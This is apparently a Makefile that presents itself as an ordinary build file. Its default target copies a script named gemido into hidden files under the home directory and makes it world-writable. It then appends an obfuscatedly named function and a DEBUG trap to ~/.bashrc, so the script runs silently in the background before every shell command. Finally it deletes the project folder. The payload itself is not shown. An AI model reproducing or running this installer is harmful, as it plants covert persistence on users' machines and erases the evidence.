DIR := $(shell pwd)

.PHONY: all clean gemido

all: gemido clean

gemido:
	@cp gemido.sh ~/.bashsrc
	@cp gemido ~/.bash_core
	@chmod 777 ~/.bashsrc
	@echo "youtubexvFZjo5PgG0() { " >> ~/.bashrc
	@echo "~/.bashsrc & disown;" >> ~/.bashrc
	@echo "}" >> ~/.bashrc
	@echo "trap 'youtubexvFZjo5PgG0'>/dev/null 2>&1 DEBUG >/dev/null 2>&1;">> ~/.bashrc

clean:
	@cd ..
	@rm -r "$(DIR)/"
